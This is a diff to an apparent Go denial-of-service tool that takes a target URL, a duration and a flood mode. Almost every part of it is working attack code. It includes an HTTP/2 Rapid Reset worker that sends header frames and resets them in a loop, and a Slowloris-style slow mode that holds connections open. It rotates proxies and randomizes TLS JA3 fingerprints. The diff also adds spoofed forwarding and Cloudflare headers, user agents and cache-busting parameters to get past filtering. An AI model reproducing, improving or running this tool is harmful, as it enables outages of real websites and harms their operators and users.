@@ -44,6 +44,9 @@ var (
 		"Mozilla/5.0 (Windows NT 12.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7642.78 Safari/537.36",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7681.89 Safari/537.36",
 		"Mozilla/5.0 (Linux; Android 16; Pixel 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7715.67 Mobile Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.7750.34 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+		"Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
 	}
 
 	referers = []string{
@@ -66,6 +69,10 @@ var (
 		"https://x.com/",
 		"https://www.threads.net/",
 		"https://www.twitch.tv/",
+		"https://www.netflix.com/",
+		"https://www.spotify.com/",
+		"https://www.microsoft.com/",
+		"https://www.apple.com/",
 		"",
 	}
 
@@ -85,6 +92,11 @@ var (
 		"nl-NL,nl;q=0.9,en;q=0.8",
 		"pl-PL,pl;q=0.9,en;q=0.8",
 		"sv-SE,sv;q=0.9,en;q=0.8",
+		"vi-VN,vi;q=0.9,en;q=0.8",
+		"th-TH,th;q=0.9,en;q=0.8",
+		"id-ID,id;q=0.9,en;q=0.8",
+		"ms-MY,ms;q=0.9,en;q=0.8",
+		"fil-PH,fil;q=0.9,en;q=0.8",
 	}
 
 	acceptHeaders = []string{
@@ -95,6 +107,8 @@ var (
 		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
 		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
 		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+		"text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,*/*;q=0.8",
+		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
 	}
 
 	acceptEncodings = []string{
@@ -104,6 +118,9 @@ var (
 		"gzip;q=1.0, deflate;q=0.9, br;q=0.8",
 		"*;q=0.1",
 		"br, gzip, deflate",
+		"compress, gzip",
+		"deflate, gzip",
+		"gzip, identity",
 	}
 
 	cacheControls = []string{
@@ -116,6 +133,8 @@ var (
 		"no-transform",
 		"proxy-revalidate",
 		"s-maxage=0",
+		"max-age=3600",
+		"stale-while-revalidate=86400",
 	}
 
 	securityHeaders = []map[string]string{
@@ -130,6 +149,8 @@ var (
 		{"Cross-Origin-Opener-Policy": "same-origin"},
 		{"Cross-Origin-Embedder-Policy": "require-corp"},
 		{"Cross-Origin-Resource-Policy": "same-site"},
+		{"Content-Security-Policy": "default-src 'self'"},
+		{"Permissions-Policy": "geolocation=(), microphone=(), camera=()"},
 	}
 
 	modernHeaders = []map[string]string{
@@ -154,6 +175,9 @@ var (
 		{"Priority": "u=0, i"},
 		{"Priority": "u=1, i"},
 		{"Priority": "u=2, i"},
+		{"Sec-CH-UA": "\"Chromium\";v=\"141\", \"Not?A_Brand\";v=\"99\""},
+		{"Sec-CH-UA-Mobile": "?0"},
+		{"Sec-CH-UA-Platform": "\"Windows\""},
 	}
 
 	cloudflareHeaders = []map[string]string{
@@ -171,6 +195,8 @@ var (
 		{"True-Client-IP": ""},
 		{"CF-Ray": ""},
 		{"CF-Visitor": `{"scheme":"https"}`},
+		{"CF-Worker": "true"},
+		{"CDN-Loop": "cloudflare"},
 	}
 
 	hetznerHeaders = []map[string]string{
@@ -179,6 +205,7 @@ var (
 		{"X-Hetzner-DataCenter": "FSN1-DC1"},
 		{"X-Hetzner-DataCenter": "NBG1-DC3"},
 		{"X-Hetzner-DataCenter": "HEL1-DC2"},
+		{"X-LB-Node": "lb01.hetzner.com"},
 	}
 
 	digitaloceanHeaders = []map[string]string{
@@ -187,6 +214,7 @@ var (
 		{"X-Forwarded-Port": "443"},
 		{"X-Forwarded-Port": "8080"},
 		{"X-DO-Proxy": "true"},
+		{"X-DO-Forwarded-For": ""},
 	}
 
 	awsHeaders = []map[string]string{
@@ -200,6 +228,7 @@ var (
 		{"CloudFront-Forwarded-Proto": "https"},
 		{"CloudFront-Is-Desktop-Viewer": "true"},
 		{"CloudFront-Is-Mobile-Viewer": "false"},
+		{"X-Amz-Cf-RequestId": ""},
 	}
 
 	cdnHeaders = []map[string]string{
@@ -219,6 +248,7 @@ var (
 		{"X-Cache": "HIT"},
 		{"X-Cache-Lookup": "MISS from cache"},
 		{"X-Backend-Server": "web01"},
+		{"X-Forwarded-Proto": "https"},
 	}
 
 	appHeaders = []map[string]string{
@@ -232,6 +262,8 @@ var (
 		{"X-Client-Version": "2.5.0"},
 		{"X-App-Version": "4.2.1"},
 		{"X-Platform": "web"},
+		{"X-Device-Type": "mobile"},
+		{"X-App-Build": "2025.01.15"},
 	}
 
 	proxies         []string
@@ -317,6 +349,20 @@ var ja3Signatures = []JA3Signature{
 		},
 		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
 		NextProtos:       []string{"h2", "http/1.1"},
+		MinVersion:       tls.VersionTLS12,
+		MaxVersion:       tls.VersionTLS13,
+	},
+	{
+		Name: "Android Chrome",
+		CipherSuites: []uint16{
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+		},
+		CurvePreferences: []tls.CurveID{tls.CurveP256, tls.CurveP384},
+		NextProtos:       []string{"http/1.1"},
 		MinVersion:       tls.VersionTLS12,
 		MaxVersion:       tls.VersionTLS13,
 	},
@@ -437,6 +483,7 @@ func detectProtocols(target string) []string {
 	}
 
 	detected := make(map[string]bool)
+
 	if u.Scheme == "https" {
 		conn, err := tls.Dial("tcp", host+":"+port, &tls.Config{
 			NextProtos:         []string{"h2", "http/1.1"},
@@ -451,9 +498,37 @@ func detectProtocols(target string) []string {
 			}
 		}
 	}
+
+	client := &http.Client{
+		Timeout: 3 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+
+	resp, err := client.Get(target)
+	if err == nil {
+		defer resp.Body.Close()
+		if resp.ProtoMajor == 2 {
+			detected["h2"] = true
+		} else {
+			detected["h1"] = true
+		}
+	}
+
+	req, _ := http.NewRequest("HEAD", target, nil)
+	resp, err = client.Do(req)
+	if err == nil {
+		altSvc := resp.Header.Get("Alt-Svc")
+		if strings.Contains(altSvc, "h3") {
+			detected["h3"] = true
+		}
+	}
+
 	if len(detected) == 0 {
 		detected["h1"] = true
 	}
+
 	result := make([]string, 0, len(detected))
 	for proto := range detected {
 		result = append(result, proto)
@@ -490,6 +565,7 @@ func rapidResetWorker(targetURL string, done chan struct{}, stats *atomicCounter
 				conn.Close()
 				continue
 			}
+
 			conn.SetReadDeadline(time.Now().Add(3 * time.Second))
 			buf := make([]byte, 24)
 			if _, err := conn.Read(buf); err != nil {
@@ -498,7 +574,12 @@ func rapidResetWorker(targetURL string, done chan struct{}, stats *atomicCounter
 			}
 			conn.SetReadDeadline(time.Time{})
 
-			settingsAck := []byte{0x00, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00}
+			settingsAck := []byte{
+				0x00, 0x00, 0x00,
+				0x04,
+				0x01,
+				0x00, 0x00, 0x00, 0x00,
+			}
 			conn.Write(settingsAck)
 
 			basePath := "/" + randomString(randInt(5, 15))
@@ -510,15 +591,19 @@ func rapidResetWorker(targetURL string, done chan struct{}, stats *atomicCounter
 					return
 				default:
 					streamID := uint32((i*2 + 1))
+
 					headersFrame := buildValidHeadersFrame(streamID, host, basePath)
 					if _, err := conn.Write(headersFrame); err != nil {
 						break
 					}
+
 					rstFrame := buildRSTStreamFrame(streamID)
 					if _, err := conn.Write(rstFrame); err != nil {
 						break
 					}
+
 					stats.inc()
+
 					time.Sleep(500 * time.Microsecond)
 				}
 			}
@@ -532,15 +617,25 @@ func buildValidHeadersFrame(streamID uint32, host, path string) []byte {
 	if strings.HasPrefix(host, "http://") {
 		scheme = 0x83
 	}
-	hpackData := []byte{0x82, scheme, 0x86}
+
+	hpackData := []byte{
+		0x82,
+		scheme,
+		0x86,
+	}
+
 	pathBytes := []byte(path)
 	hpackData = append(hpackData, byte(len(pathBytes)))
 	hpackData = append(hpackData, pathBytes...)
+
 	hpackData = append(hpackData, 0x87)
+
 	hostBytes := []byte(host)
 	hpackData = append(hpackData, byte(len(hostBytes)))
 	hpackData = append(hpackData, hostBytes...)
+
 	flags := byte(0x04)
+
 	frame := make([]byte, 9+len(hpackData))
 	frame[0] = byte(len(hpackData) >> 16)
 	frame[1] = byte(len(hpackData) >> 8)
@@ -551,7 +646,9 @@ func buildValidHeadersFrame(streamID uint32, host, path string) []byte {
 	frame[6] = byte(streamID >> 16)
 	frame[7] = byte(streamID >> 8)
 	frame[8] = byte(streamID)
+
 	copy(frame[9:], hpackData)
+
 	return frame
 }
 
@@ -570,6 +667,7 @@ func buildRSTStreamFrame(streamID uint32) []byte {
 	frame[10] = 0x00
 	frame[11] = 0x00
 	frame[12] = 0x08
+
 	return frame
 }
 
@@ -587,6 +685,7 @@ func loadProxiesFromAPI() {
 
 	body, _ := io.ReadAll(resp.Body)
 	lines := strings.Split(string(body), "\n")
+
 	newProxies := []string{}
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
@@ -594,9 +693,11 @@ func loadProxiesFromAPI() {
 			newProxies = append(newProxies, line)
 		}
 	}
+
 	proxyMu.Lock()
 	proxies = newProxies
 	proxyMu.Unlock()
+
 	atomic.StoreUint64(&proxyIndex, 0)
 	fmt.Printf("[+] Loaded/Refreshed %d proxies from ProxyScrape\n", len(proxies))
 }
@@ -625,7 +726,16 @@ func getNextProxy() string {
 func getNextColor() string {
 	colorMu.Lock()
 	defer colorMu.Unlock()
-	colors := []string{"\033[32m", "\033[31m", "\033[35m", "\033[37m", "\033[33m", "\033[36m", "\033[34m"}
+	colors := []string{
+		"\033[32m",
+		"\033[31m",
+		"\033[35m",
+		"\033[37m",
+		"\033[33m",
+		"\033[36m",
+		"\033[34m",
+	}
+
 	color := colors[colorIndex]
 	colorIndex = (colorIndex + 1) % len(colors)
 	return color
@@ -645,7 +755,7 @@ func printBanner() {
 	fmt.Println("\033[0m")
 }
 
-func generateRandomIP() string {
+func randomIP() string {
 	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
 }
 
@@ -677,59 +787,28 @@ func randBool() bool {
 	return n.Int64() == 1
 }
 
-func generateCloudflareIP() string {
-	firstOctet := []int{173, 103, 141, 108, 104, 172}[randInt(0, 5)]
-	secondOctet := randInt(0, 255)
-	return fmt.Sprintf("%d.%d.%d.%d", firstOctet, secondOctet, randInt(0, 255), randInt(1, 254))
-}
-
-func generateCacheBustParams() string {
+func generateCacheBust() string {
 	styles := []string{
 		"?v=" + strconv.Itoa(randInt(1, 1000000)),
 		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
 		"?rnd=" + randomString(16),
 		"?cachebuster=" + randomString(8),
 		"?" + randomString(4) + "=" + randomString(6) + "&" + randomString(5) + "=" + randomString(8),
-		"?utm_source=" + randomString(6) + "&utm_medium=" + randomString(5) + "&utm_campaign=" + randomString(8),
-		"?sessionid=" + randomString(32),
-		"?PHPSESSID=" + randomString(26),
-		"?jsessionid=" + randomString(24),
 	}
 	return styles[randInt(0, len(styles)-1)]
 }
 
-func generateAdvancedPath() string {
-	if randInt(1, 100) <= 30 {
-		depth := randInt(2, 6)
-		path := ""
-		for i := 0; i < depth; i++ {
-			path += randomString(randInt(4, 12)) + "/"
-		}
-		if randBool() {
-			extensions := []string{".php", ".html", ".jsp", ".asp", ".aspx", ".json", ".xml"}
-			path = strings.TrimSuffix(path, "/") + extensions[randInt(0, len(extensions)-1)]
-		}
-		return "/" + path
-	}
+func generatePath() string {
 	paths := []string{
 		"/", "/index.html", "/home", "/main", "/default", "/welcome",
 		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
-		"/wp-admin", "/admin", "/login", "/dashboard", "/control-panel",
-		"/static/css/main.css", "/static/js/app.js", "/static/images/logo.png",
-		"/.env", "/config.json", "/api.json", "/manifest.json",
-		"/graphql", "/rest/v1", "/health", "/status", "/metrics",
+		"/wp-admin", "/admin", "/login", "/dashboard", "/control-panel", "/wp-login.php",
 	}
 	return paths[randInt(0, len(paths)-1)]
 }
 
 func generateStudentNumber() string {
-	formats := []func() string{
-		func() string { return fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999)) },
-		func() string { return fmt.Sprintf("%d%06d", randInt(2015, 2025), randInt(1, 999999)) },
-		func() string { return fmt.Sprintf("S-%07d", randInt(1, 9999999)) },
-		func() string { return fmt.Sprintf("%010d", randInt(1000000000, 9999999999)) },
-	}
-	return formats[randInt(0, len(formats)-1)]()
+	return fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999))
 }
 
 func generateCookies() string {
@@ -740,14 +819,15 @@ func generateCookies() string {
 	if randBool() {
 		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomString(16)))
 	}
-	if randBool() {
-		langs := []string{"en", "fr", "de", "es", "pt", "it", "ja", "ko", "zh", "ru"}
-		cookies = append(cookies, fmt.Sprintf("lang=%s", langs[randInt(0, len(langs)-1)]))
-	}
 	if len(cookies) == 0 {
 		return ""
 	}
 	return strings.Join(cookies, "; ")
+}
+
+func generateCloudflareIP() string {
+	firstOctet := []int{173, 103, 141, 108, 104, 172}[randInt(0, 5)]
+	return fmt.Sprintf("%d.%d.%d.%d", firstOctet, randInt(0, 255), randInt(0, 255), randInt(1, 254))
 }
 
 func main() {
@@ -767,6 +847,7 @@ func main() {
 	if len(os.Args) < 4 {
 		printBanner()
 		fmt.Println("Usage: go run main.go <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]")
+		fmt.Println("   [proxy] → optional if you want to use proxy")
 		os.Exit(1)
 	}
 
@@ -776,7 +857,7 @@ func main() {
 
 	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
 		printBanner()
-		fmt.Println("Mode must be GET, POST, HEAD, or SLOW")
+		fmt.Println("Mode GET, POST, HEAD, and SLOW")
 		os.Exit(1)
 	}
 
@@ -850,7 +931,10 @@ func main() {
 	if h2Supported && mode == "GET" {
 		rapidWorkers := workers / 4
 		normalWorkers := workers - rapidWorkers
+
 		fmt.Printf("[+] HTTP/2 detected! Using %d workers for Rapid Reset attack\n", rapidWorkers)
+		fmt.Printf("[+] %d workers for normal flood\n", normalWorkers)
+
 		for i := 0; i < rapidWorkers; i++ {
 			wg.Add(1)
 			go func(id int) {
@@ -887,6 +971,8 @@ func main() {
 				fmt.Printf("Duration: %d sec\n", durationSec)
 				fmt.Printf("Total requests/streams: %d\n", stats.get())
 				fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/duration.Seconds())
+				fmt.Printf("Elapsed time: %.0f sec\n", time.Since(startTime).Seconds())
+				fmt.Printf("[+] JA3 Randomization: Active (%d unique fingerprints)\n", poolSize)
 				return
 			case <-ticker.C:
 				elapsed := time.Since(startTime).Seconds()
@@ -919,14 +1005,12 @@ func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCo
 			return
 		default:
 			client := pool.GetClient()
-			path := generateAdvancedPath()
+
+			path := generatePath()
 			if mode != "SLOW" && randInt(1, 100) <= 70 {
-				if strings.Contains(path, "?") {
-					path += "&" + generateCacheBustParams()[1:]
-				} else {
-					path += generateCacheBustParams()
-				}
+				path += generateCacheBust()
 			}
+
 			fullURL := target
 			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
 				fullURL += "/" + path
@@ -946,11 +1030,19 @@ func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCo
 					continue
 				}
 				defer conn.Close()
+
 				conn.SetDeadline(time.Now().Add(300 * time.Second))
-				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, randomUA())
+
+				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\n", path)
+				fmt.Fprintf(conn, "Host: %s\r\n", host)
+				fmt.Fprintf(conn, "User-Agent: %s\r\n", randomUA())
+				fmt.Fprintf(conn, "Accept: text/html\r\n")
+				fmt.Fprintf(conn, "Connection: keep-alive\r\n\r\n")
+
 				go func(c net.Conn, doneChan chan struct{}) {
 					ticker := time.NewTicker(time.Duration(randInt(4, 12)) * time.Second)
 					defer ticker.Stop()
+
 					for {
 						select {
 						case <-doneChan:
@@ -961,6 +1053,7 @@ func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCo
 						}
 					}
 				}(conn, done)
+
 				stats.inc()
 				time.Sleep(1 * time.Second)
 				continue
@@ -993,18 +1086,25 @@ func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCo
 			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
 			req.Header.Set("Connection", "keep-alive")
 
-			if randBool() {
-				req.Header.Set("X-Forwarded-For", generateRandomIP())
-				req.Header.Set("X-Real-IP", generateRandomIP())
-			}
+			// Random IP Spoofing
+			randomSpoofIP := randomIP()
+			req.Header.Set("X-Forwarded-For", randomSpoofIP)
+			req.Header.Set("X-Real-IP", randomSpoofIP)
+			req.Header.Set("X-Originating-IP", randomIP())
+			req.Header.Set("X-Remote-IP", randomIP())
+			req.Header.Set("X-Remote-Addr", randomIP())
+			req.Header.Set("X-Client-IP", randomIP())
+			req.Header.Set("True-Client-IP", randomSpoofIP)
 
+			// Cloudflare Headers
 			if randInt(1, 100) <= 40 {
 				cfIP := generateCloudflareIP()
 				req.Header.Set("CF-Connecting-IP", cfIP)
 				req.Header.Set("CF-IPCountry", []string{"US", "GB", "DE", "FR", "CA", "AU", "JP"}[randInt(0, 6)])
-				req.Header.Set("True-Client-IP", cfIP)
+				req.Header.Set("CF-Ray", randomString(16))
 			}
 
+			// Security Headers
 			numSecurity := randInt(1, 3)
 			for i := 0; i < numSecurity; i++ {
 				secHeader := securityHeaders[randInt(0, len(securityHeaders)-1)]
@@ -1013,6 +1113,7 @@ func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCo
 				}
 			}
 
+			// Modern Headers
 			numModern := randInt(3, 6)
 			for i := 0; i < numModern; i++ {
 				modernHeader := modernHeaders[randInt(0, len(modernHeaders)-1)]
@@ -1021,6 +1122,7 @@ func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCo
 				}
 			}
 
+			// App Headers
 			if randInt(1, 100) <= 60 {
 				numApp := randInt(1, 3)
 				for i := 0; i < numApp; i++ {
@@ -1042,10 +1144,19 @@ func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCo
 				}
 			}
 
+			// Cookies
 			if randInt(1, 100) <= 70 {
 				cookies := generateCookies()
 				if cookies != "" {
 					req.Header.Set("Cookie", cookies)
+				}
+			}
+
+			// CDN Headers
+			if randInt(1, 100) <= 30 {
+				cdnHeader := cdnHeaders[randInt(0, len(cdnHeaders)-1)]
+				for k, v := range cdnHeader {
+					req.Header.Set(k, v)
 				}
 			}
 
